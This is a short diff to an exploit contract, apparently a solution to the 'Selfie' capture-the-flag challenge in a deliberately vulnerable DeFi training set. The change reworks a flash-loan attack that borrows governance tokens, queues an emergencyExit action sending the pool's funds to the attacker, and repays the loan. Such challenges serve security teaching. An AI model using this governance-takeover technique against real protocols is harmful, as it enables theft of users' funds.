@@ -23,9 +23,7 @@ contract AttackSelfie {
 
         uint256 amount = _pool.token().balanceOf(address(_pool));
         
-        bytes memory _calldata = abi.encodeWithSignature("emergencyExit(address)", _owner);
-        
-        _pool.flashLoan(IERC3156FlashBorrower(address(this)), _token, amount, _calldata);
+        _pool.flashLoan(IERC3156FlashBorrower(address(this)), _token, amount, "");
     }
 
     function attackQueueExecute() public {
@@ -37,7 +35,7 @@ contract AttackSelfie {
     function onFlashLoan(address borrower, address token, uint256 amount, uint256 fee, bytes calldata _data) external returns (bytes32) {
         require(msg.sender == address(_pool), "not pool");
 
-        _actionId = _pool.governance().queueAction(address(_pool), 0, _data);
+        _actionId = _pool.governance().queueAction(address(_pool), 0, abi.encodeWithSignature("emergencyExit(address)", _owner));
         DamnValuableTokenSnapshot(token).approve(address(_pool), amount);
 
         return keccak256("ERC3156FlashBorrower.onFlashLoan");
